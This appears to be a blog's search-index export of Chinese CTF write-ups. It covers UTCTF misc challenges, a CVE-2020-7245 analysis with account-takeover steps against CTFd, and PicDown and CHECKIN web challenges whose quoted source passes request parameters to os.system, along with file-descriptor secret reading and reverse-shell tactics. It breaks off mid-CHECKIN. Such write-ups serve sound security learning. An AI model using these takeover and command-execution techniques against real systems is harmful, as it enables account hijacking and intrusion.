<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>UTCTF-misc合集</title>
    <url>/2020/05/21/UTCTF-misc%E5%90%88%E9%9B%86/</url>
    <content><![CDATA[<p>熬夜搞得有、头疼。今天原本想复盘朱雀的namp、phpweb和buu的online tool的，现在没有啥状态，先写几道misc调整一下状态。</p>
<h3 id="UTCTF2020-zero"><a href="#UTCTF2020-zero" class="headerlink" title="[UTCTF2020]zero"></a>[UTCTF2020]zero</h3><p>考点：零宽度字符隐写</p>
<p>打开txt，发现显示列数远多于字母数，拿vim打开，发现许多&lt;200b&gt;之类文字，于是想到<a href="http://330k.github.io/misc_tools/unicode_steganography.html" target="_blank" rel="noopener">零宽度字符</a></p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/05/21/UTCTF-misc%E5%90%88%E9%9B%86/1.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="UTCTF2020-basic-forensics"><a href="#UTCTF2020-basic-forensics" class="headerlink" title="[UTCTF2020]basic-forensics"></a>[UTCTF2020]basic-forensics</h3><p>考点：Ctrl F</p>
<p>花里胡哨的一个jpeg文件，放到010里面打开，发现有很多章节啥的</p>
<p>然后我以为是要字频统计，Ctrl F搜了一下<code>{</code>，得到flag</p>
<h3 id="UTCTF2020-docx"><a href="#UTCTF2020-docx" class="headerlink" title="[UTCTF2020]docx"></a>[UTCTF2020]docx</h3><p>考点：docx本质、寻找能力</p>
<p>拿到题目，打开看了一下内容并没有发现什么有用的信息</p>
<p>转后缀为zip，发现很多图片，以为没用没仔细翻，然后看了眼属性发现有一句<code>链接失效了吗？</code>，开始想是不是要访问文中给的链接，然后自己否定了。以为要统计字体或者行高什么的了，又把自己否定了。</p>
<p>最后又把后缀改成zip，去看xml里面有没有flag，没找到。去一堆png里面发现了一张大小比较大的，打开看看，得到flag。</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/05/21/UTCTF-misc%E5%90%88%E9%9B%86/2.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="UTCTF2020-file-header"><a href="#UTCTF2020-file-header" class="headerlink" title="[UTCTF2020]file header"></a>[UTCTF2020]file header</h3><p>考点：文件头</p>
<p>题目提示很明显，拿到文件放进010，补上文件头89504e47，得到flag</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/05/21/UTCTF-misc%E5%90%88%E9%9B%86/3.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="UTCTF2020-File-Carving"><a href="#UTCTF2020-File-Carving" class="headerlink" title="[UTCTF2020]File Carving"></a>[UTCTF2020]File Carving</h3><p>考点：binwalk、strings</p>
<p>先尝试了<code>zsteg</code>，发现了<code>This is one of the twists: there is no flag here!</code>，和一个多余的zip包。于是用<code>foremost</code>分离，得到hidden_binary，<code>file</code>一下是个elf文件（还以为是个啥加密要用到上面的hint），然后<code>strings</code>一下得到flag。</p>
<h3 id="UTCTF2020-spectogram"><a href="#UTCTF2020-spectogram" class="headerlink" title="[UTCTF2020]spectogram"></a>[UTCTF2020]spectogram</h3><p>考点：频谱图</p>
<p>放进au，转换为频谱图得到flag</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/05/21/UTCTF-misc%E5%90%88%E9%9B%86/4.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="UTCTF2020-sstv"><a href="#UTCTF2020-sstv" class="headerlink" title="[UTCTF2020]sstv"></a>[UTCTF2020]sstv</h3><p>考点：无线电转图片、Robot36</p>
<p>sstv将图片转化为声音，robot36可以将其转换回来。但是我整不出来了，耳朵快整聋了，手机还是没识别出来（就一小段</p>
<p>看ctftime上的wp是用<a href="https://razvioverflow.github.io/ctfwriteups/UTCTF2020/#basics" target="_blank" rel="noopener">QSSTV</a>还原的</p>
<p>我整了个mmsstv还不会用。。</p>
<h3 id="UTCTF2020-dns-shell"><a href="#UTCTF2020-dns-shell" class="headerlink" title="[UTCTF2020]dns-shell"></a>[UTCTF2020]dns-shell</h3><p>这题我不会，只能做到下面这一步（而且wp看不懂</p>
<p><code>ls -la</code></p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/05/21/UTCTF-misc%E5%90%88%E9%9B%86/5.png" src="/img/loading.gif" class="lazyload"></a>

<p>详情见：<a href="https://meowmeowxw.gitlab.io/ctf/utctf-2020-do-not-stop/" target="_blank" rel="noopener">https://meowmeowxw.gitlab.io/ctf/utctf-2020-do-not-stop/</a></p>
<h3 id="UTCTF2020-gb"><a href="#UTCTF2020-gb" class="headerlink" title="[UTCTF2020]gb"></a>[UTCTF2020]gb</h3><h3 id="UTCTF2020-icmp-file-transfer"><a href="#UTCTF2020-icmp-file-transfer" class="headerlink" title="[UTCTF2020]icmp-file-transfer"></a>[UTCTF2020]icmp-file-transfer</h3><p>没做捏不想做了，困了。。</p>
]]></content>
      <categories>
        <category>Misc</category>
      </categories>
      <tags>
        <tag>Write_up</tag>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title>V&amp;N2020公开赛 HappyCTFd(CVE-2020-7245)</title>
    <url>/2020/05/19/VN2020%E5%85%AC%E5%BC%80%E8%B5%9B-HappyCTFd-CVE-2020-7245/</url>
    <content><![CDATA[<h3 id="CVE-2020-7245"><a href="#CVE-2020-7245" class="headerlink" title="CVE-2020-7245"></a>CVE-2020-7245</h3><h4 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h4><p>   在 CTFd v2.0.0 - v2.2.2 的注册过程中，如果知道用户名并在 CTFd 实例上启用电子邮件，则攻击者可以修改任意帐户的密码。（有、懒了，不太想搭了，直接分析有问题的<a href="https://github.com/CTFd/CTFd/" target="_blank" rel="noopener">源码</a>吧。）</p>
<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>部分源码</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">()</span>:</span></span><br><span class="line">    errors = get_errors()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        name = request.form[<span class="string">'name'</span>]</span><br><span class="line">        email_address = request.form[<span class="string">'email'</span>]</span><br><span class="line">        password = request.form[<span class="string">'password'</span>]</span><br><span class="line"></span><br><span class="line">        name_len = len(name) == <span class="number">0</span></span><br><span class="line">        names = Users.query.add_columns(<span class="string">'name'</span>, <span class="string">'id'</span>).filter_by(name=name).first()</span><br><span class="line">        emails = Users.query.add_columns(<span class="string">'email'</span>, <span class="string">'id'</span>).filter_by(email=email_address).first()</span><br><span class="line">        pass_short = len(password) == <span class="number">0</span></span><br><span class="line">        </span><br><span class="line">	    <span class="keyword">if</span> names:</span><br><span class="line">			errors.append(<span class="string">"That user name is already taken"</span>)</span><br><span class="line">			<span class="comment"># 省略一部分代码</span></span><br><span class="line">		<span class="keyword">if</span> len(errors) &gt; <span class="number">0</span>:</span><br><span class="line">			<span class="keyword">return</span> render_template(</span><br><span class="line">			<span class="string">"register.html"</span>,</span><br><span class="line">			errors=errors,</span><br><span class="line">			name=request.form[<span class="string">"name"</span>],</span><br><span class="line">			email=request.form[<span class="string">"email"</span>],</span><br><span class="line">			password=request.form[<span class="string">"password"</span>],</span><br><span class="line">			)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="keyword">with</span> app.app_context():</span><br><span class="line">			user = Users(</span><br><span class="line">			name=name.strip(),</span><br><span class="line">			email=email_address.lower(),</span><br><span class="line">			password=password.strip(),</span><br><span class="line">			)</span><br></pre></td></tr></table></figure></div>

<p>根据上面的代码我们可以看到 可以看到 当我们通过POST发来注册请求的时候，其中的name参数并没有经过处理，而是</p>
<p>直接被再次当作参数传入。而当name通过了各种检查之后，即将存入时，使用了strip方法对name进行了处理。</p>
<blockquote>
<p>Python strip() 方法用于移除字符串头尾指定的字符（默认为空格或换行符）或字符序列。</p>
<p><strong>注意：</strong>该方法只能删除开头或是结尾的字符，不能删除中间部分的字符。</p>
</blockquote>
<p>因此我们，如果我们在用户名的首尾添加上空格的时候，可以绕过用户名重复的检查存入数据库之前空格会被删去，那么</p>
<p>就会导致注册的用户名会和数据库中已有的重复。</p>
<p>找回密码部分的代码：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reset_password</span><span class="params">(data=None)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            name = unserialize(data, max_age=<span class="number">1800</span>)</span><br><span class="line">        <span class="keyword">except</span> (BadTimeSignature, SignatureExpired):</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">'reset_password.html'</span>, errors=[<span class="string">'Your link has expired'</span>])</span><br><span class="line">        <span class="keyword">except</span> (BadSignature, TypeError, base64.binascii.Error):</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">'reset_paassword.html'</span>, errors=[<span class="string">'Your reset token is invalid'</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> request.method == <span class="string">"GET"</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">'reset_password.html'</span>, mode=<span class="string">'set'</span>)</span><br><span class="line">        <span class="keyword">if</span> request.method == <span class="string">"POST"</span>:</span><br><span class="line">            user = Users.query.filter_by(name=name).first_or_404()</span><br><span class="line">            user.password = request.form[<span class="string">'password'</span>].strip()</span><br><span class="line">            db.session.commit()</span><br><span class="line">            log(<span class="string">'logins'</span>, format=<span class="string">"[&#123;date&#125;] &#123;ip&#125; -  successful password reset for &#123;name&#125;"</span>, name=name)</span><br><span class="line">            db.session.close()</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'auth.login'</span>))</span><br></pre></td></tr></table></figure></div>

<p>找回密码时从链接参数中取data值，将其反序列化后可获得用户名，即可更改任意用户的密码。我们再看一下这个链接是怎么得到的，也就是data是怎么生成的。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">forgot_password</span><span class="params">(email, team_name)</span>:</span></span><br><span class="line">    token = serialize(team_name)</span><br><span class="line">    text = <span class="string">"""Did you initiate a password reset? Click the following link to reset your password:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;0&#125;/&#123;1&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span>.format(url_for(<span class="string">'auth.reset_password'</span>, _external=<span class="literal">True</span>), token)</span><br><span class="line"></span><br><span class="line">    sendmail(email, text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify_email_address</span><span class="params">(addr)</span>:</span></span><br><span class="line">    token = serialize(addr)</span><br><span class="line">    text = <span class="string">"""Please click the following link to confirm your email address for &#123;ctf_name&#125;: &#123;url&#125;/&#123;token&#125;"""</span>.format(</span><br><span class="line">        ctf_name=get_config(<span class="string">'ctf_name'</span>),</span><br><span class="line">        url=url_for(<span class="string">'auth.confirm'</span>, _external=<span class="literal">True</span>),</span><br><span class="line">        token=token</span><br><span class="line">    )</span><br><span class="line">    sendmail(addr, text)</span><br></pre></td></tr></table></figure></div>

<p>上面可以看到这个token是直接将team_name做一次序列化处理后拼接到url中发送到用户的邮箱。</p>
<p>serialize方法的实现（利用flask自身的类似客户端cookie的序列化方式做了一个加密。）</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">serialize</span><span class="params">(data, secret=None)</span>:</span></span><br><span class="line">	<span class="keyword">if</span> secret <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">	secret = current_app.config[<span class="string">"SECRET_KEY"</span>]</span><br><span class="line">	s = URLSafeTimedSerializer(secret)</span><br><span class="line">	<span class="keyword">return</span> s.dumps(data)</span><br></pre></td></tr></table></figure></div>

<h4 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h4><ol>
<li>利用添加空格绕过限制来注册一个与受害者用户名相同的账号</li>
<li>生成忘记密码链接发送到自己的邮箱</li>
<li>将自己的账号的用户名改成与被攻击者不相同的用户名</li>
<li>用邮箱中收到的链接更改密码即可。</li>
</ol>
<p>参考链接：<a href="https://www.cnblogs.com/d3solate/" target="_blank" rel="noopener">d3solate</a>、<a href="https://www.colabug.com/" target="_blank" rel="noopener">CoLaBug.com</a></p>
<h3 id="V-amp-N2020公开赛-HappyCTFd"><a href="#V-amp-N2020公开赛-HappyCTFd" class="headerlink" title="[V&amp;N2020公开赛]HappyCTFd"></a>[V&amp;N2020公开赛]HappyCTFd</h3><p>这个题目要先申请一个buu的<a href="http://mail.buuoj.cn/admin" target="_blank" rel="noopener">内网邮箱</a></p>
<p>  打开题目后，在User栏发现有个admin用户。于是申请一个账户，在name栏填上admin并添加空格绕过相同用户名的限制。邮箱记得填内网邮箱，因为外网邮箱buu的docker发不出去。</p>
<p>  下面就是退出登录、忘记密码、改用户名、点击链接改admin的密码、上admin的账号</p>
<p>有个<code>Admin Panel</code>点进去，发现下图，下载附件就得到flag了</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/05/19/VN2020%E5%85%AC%E5%BC%80%E8%B5%9B-HappyCTFd-CVE-2020-7245/1.png" src="/img/loading.gif" class="lazyload"></a>

]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Write_up</tag>
        <tag>Web</tag>
        <tag>CTFd</tag>
      </tags>
  </entry>
  <entry>
    <title>2020网鼎杯PicDown、V&amp;N2020CHECKIN（文件描述符、弹shell）</title>
    <url>/2020/05/19/2020%E7%BD%91%E9%BC%8E%E6%9D%AFPicDown%E3%80%81VNCHECKIN%EF%BC%88%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E3%80%81%E5%BC%B9shell%EF%BC%89/</url>
    <content><![CDATA[<h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>1.<a href="https://blog.csdn.net/mediatec/article/details/88578101" target="_blank" rel="noopener">Linux proc目录详解</a></p>
<blockquote>
<p>proc文件系统是一个伪文件系统，它只存在内存当中，而不占用外存空间。它以文件系统的方式为访问系统内核数据的操作提供接口。</p>
<p>self目录是读取进程本身的信息接口</p>
<p>cmdline 启动当前进程的完整命令</p>
<p>fd 包含当前进程打开的每一个文件的文件描述符（file descriptor），这些文件描述符是指向实际文件的一个符号链接</p>
</blockquote>
<p>2.<a href="https://blog.csdn.net/cywosp/article/details/38965239" target="_blank" rel="noopener">文件描述符</a></p>
<blockquote>
<p>文件描述符，在linux里，当一个进程打开某个文件直到关闭前，该进程会获得文件描述符，而文件描述符里有文</p>
<p>件的内容，即便已经将文件删除，只是删除了其相应的目录索引节点，若进程依然存在没被关闭的话，就依然可</p>
<p>以通过文件提供给它的文件描述符进行操作。/proc/[pid]/fd 这个目录里包含了进程打开文件的情况。pid就是进程</p>
<p>记录的打开文件的序号。</p>
<p>转自<a href="https://www.cnblogs.com/Wanghaoran-s1mple/p/12514481.html" target="_blank" rel="noopener">https://www.cnblogs.com/Wanghaoran-s1mple/p/12514481.html</a></p>
</blockquote>
<p>3.python相关函数的了解（lower()、startswith()、urlopen()……）</p>
<p>4.<a href="https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html" target="_blank" rel="noopener">反弹shell</a>的几种操作（常用bash、nc、curl、python、perl、php）</p>
<h3 id="网鼎杯-2020-白虎组-PicDown"><a href="#网鼎杯-2020-白虎组-PicDown" class="headerlink" title="[网鼎杯 2020 白虎组]PicDown"></a>[网鼎杯 2020 白虎组]PicDown</h3><p>尝试包含一下文件，发现可以读取，并以jpg的形式下载下来（直接读<code>/flag</code>就得到flag了….不过显然要好好做）</p>
<p>于是抓包，尝试读取cmdline</p>
<a href="/2020/05/19/2020%E7%BD%91%E9%BC%8E%E6%9D%AFPicDown%E3%80%81VNCHECKIN%EF%BC%88%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E3%80%81%E5%BC%B9shell%EF%BC%89/1.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/05/19/2020%E7%BD%91%E9%BC%8E%E6%9D%AFPicDown%E3%80%81VNCHECKIN%EF%BC%88%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E3%80%81%E5%BC%B9shell%EF%BC%89/1.png" src="/img/loading.gif" class="lazyload"></a>

<p>发现app.py，读取一下，得到下面源码</p>
<a href="/2020/05/19/2020%E7%BD%91%E9%BC%8E%E6%9D%AFPicDown%E3%80%81VNCHECKIN%EF%BC%88%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E3%80%81%E5%BC%B9shell%EF%BC%89/2.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/05/19/2020%E7%BD%91%E9%BC%8E%E6%9D%AFPicDown%E3%80%81VNCHECKIN%EF%BC%88%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E3%80%81%E5%BC%B9shell%EF%BC%89/2.png" src="/img/loading.gif" class="lazyload"></a>

<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">SECRET_FILE = <span class="string">"/tmp/secret.txt"</span></span><br><span class="line">f = open(SECRET_FILE)</span><br><span class="line">SECRET_KEY = f.read().strip()</span><br><span class="line">os.remove(SECRET_FILE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'search.html'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/page')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page</span><span class="params">()</span>:</span></span><br><span class="line">    url = request.args.get(<span class="string">"url"</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> url.lower().startswith(<span class="string">"file"</span>):</span><br><span class="line">            res = urllib.urlopen(url)</span><br><span class="line">            value = res.read()</span><br><span class="line">            response = Response(value, mimetype=<span class="string">'application/octet-stream'</span>)</span><br><span class="line">            response.headers[<span class="string">'Content-Disposition'</span>] = <span class="string">'attachment; filename=beautiful.jpg'</span></span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            value = <span class="string">"HACK ERROR!"</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        value = <span class="string">"SOMETHING WRONG!"</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'search.html'</span>, res=value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/no_one_know_the_manager')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">manager</span><span class="params">()</span>:</span></span><br><span class="line">    key = request.args.get(<span class="string">"key"</span>)</span><br><span class="line">    print(SECRET_KEY)</span><br><span class="line">    <span class="keyword">if</span> key == SECRET_KEY:</span><br><span class="line">        shell = request.args.get(<span class="string">"shell"</span>)</span><br><span class="line">        os.system(shell)</span><br><span class="line">        res = <span class="string">"ok"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res = <span class="string">"Wrong Key!"</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure></div>

<p>有一个可以利用的点，向<code>/no_one_know_the_manager</code>中传入<code>key</code>和<code>shell</code>参数可以通过<code>os.system(shell)</code>，来取得shell</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route('/no_one_know_the_manager')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">manager</span><span class="params">()</span>:</span></span><br><span class="line">    key = request.args.get(<span class="string">"key"</span>)</span><br><span class="line">    print(SECRET_KEY)</span><br><span class="line">    <span class="keyword">if</span> key == SECRET_KEY:</span><br><span class="line">        shell = request.args.get(<span class="string">"shell"</span>)</span><br><span class="line">        os.system(shell)</span><br><span class="line">        res = <span class="string">"ok"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res = <span class="string">"Wrong Key!"</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure></div>

<p>但是其中的<code>key</code>参数要等于<code>SECRET_KEY</code>，也就是<code>/tmp/secret.txt</code>中的内容</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">SECRET_FILE = <span class="string">"/tmp/secret.txt"</span></span><br><span class="line">f = open(SECRET_FILE)</span><br><span class="line">SECRET_KEY = f.read().strip()</span><br><span class="line">os.remove(SECRET_FILE)</span><br></pre></td></tr></table></figure></div>

<p>我们尝试读取时，发现读不出来内容，因为这个文件已经被<code>os.remove(SECRET_FILE)</code>删除了，但是因为这个文件还是打开状态，所以我们考虑通过文件描述符<code>/proc/self/fd/3</code>来读取</p>
<a href="/2020/05/19/2020%E7%BD%91%E9%BC%8E%E6%9D%AFPicDown%E3%80%81VNCHECKIN%EF%BC%88%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E3%80%81%E5%BC%B9shell%EF%BC%89/3.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/05/19/2020%E7%BD%91%E9%BC%8E%E6%9D%AFPicDown%E3%80%81VNCHECKIN%EF%BC%88%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E3%80%81%E5%BC%B9shell%EF%BC%89/3.png" src="/img/loading.gif" class="lazyload"></a>

<p>得到<code>key</code>的值，下一步反弹shell，因为没回显，只显示<code>ok</code></p>
<p>尝试了bash和nc都不行，在vps上包含个bash一句话，拿curl连成功了</p>
<a href="/2020/05/19/2020%E7%BD%91%E9%BC%8E%E6%9D%AFPicDown%E3%80%81VNCHECKIN%EF%BC%88%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E3%80%81%E5%BC%B9shell%EF%BC%89/4.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/05/19/2020%E7%BD%91%E9%BC%8E%E6%9D%AFPicDown%E3%80%81VNCHECKIN%EF%BC%88%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E3%80%81%E5%BC%B9shell%EF%BC%89/4.png" src="/img/loading.gif" class="lazyload"></a>

<p>如果遇到key中有加号<code>+</code>，就拿<code>%2B</code>来代替，最后放一下vps上的操作和bash一句话</p>
<a href="/2020/05/19/2020%E7%BD%91%E9%BC%8E%E6%9D%AFPicDown%E3%80%81VNCHECKIN%EF%BC%88%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E3%80%81%E5%BC%B9shell%EF%BC%89/5.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/05/19/2020%E7%BD%91%E9%BC%8E%E6%9D%AFPicDown%E3%80%81VNCHECKIN%EF%BC%88%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E3%80%81%E5%BC%B9shell%EF%BC%89/5.png" src="/img/loading.gif" class="lazyload"></a>

<p>这题wp拖的时间有、长了，开了三次题目，三次靶机（中间上信号去了。。）</p>
<h3 id="V-amp-N2020-公开赛-CHECKIN"><a href="#V-amp-N2020-公开赛-CHECKIN" class="headerlink" title="[V&amp;N2020 公开赛]CHECKIN"></a>[V&amp;N2020 公开赛]CHECKIN</h3><p>开题后得到源码</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">flag_file = open(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>)</span><br><span class="line"><span class="comment"># flag = flag_file.read()</span></span><br><span class="line"><span class="comment"># flag_file.close()</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># @app.route('/flag')</span></span><br><span class="line"><span class="comment"># def flag():</span></span><br><span class="line"><span class="comment">#     return flag</span></span><br><span class="line"><span class="comment">## want flag? naive!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># You will never find the thing you want:) I think</span></span><br><span class="line"><span class="meta">@app.route('/shell')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shell</span><span class="params">()</span>:</span></span><br><span class="line">    os.system(<span class="string">"rm -f flag.txt"</span>)</span><br><span class="line">    exec_cmd = request.args.get(<span class="string">'c'</span>)</span><br><span class="line">    os.system(exec_cmd)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"1"</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">source</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"app.py"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure></div>

<p>shell函数可以利用</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route('/shell')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shell</span><span class="params">()</span>:</span></span><br><span class="line">    os.system(<span class="string">"rm -f flag.txt"</span>)</span><br><span class="line">    exec_cmd = request.args.get(<span class="string">'c'</span>)</span><br><span class="line">    os.system(exec_cmd)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"1"</span></span><br></pre></td></tr></table></figure></div>

<p>于是抓包传入参数<code>c</code>，发现只有<code>return &quot;1&quot;</code>，没有命令回显</p>
<a href="/2020/05/19/2020%E7%BD%91%E9%BC%8E%E6%9D%AFPicDown%E3%80%81VNCHECKIN%EF%BC%88%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E3%80%81%E5%BC%B9shell%EF%BC%89/6.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/05/19/2020%E7%BD%91%E9%BC%8E%E6%9D%AFPicDown%E3%80%81VNCHECKIN%EF%BC%88%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E3%80%81%E5%BC%B9shell%EF%BC%89/6.png" src="/img/loading.gif" class="lazyload"></a>

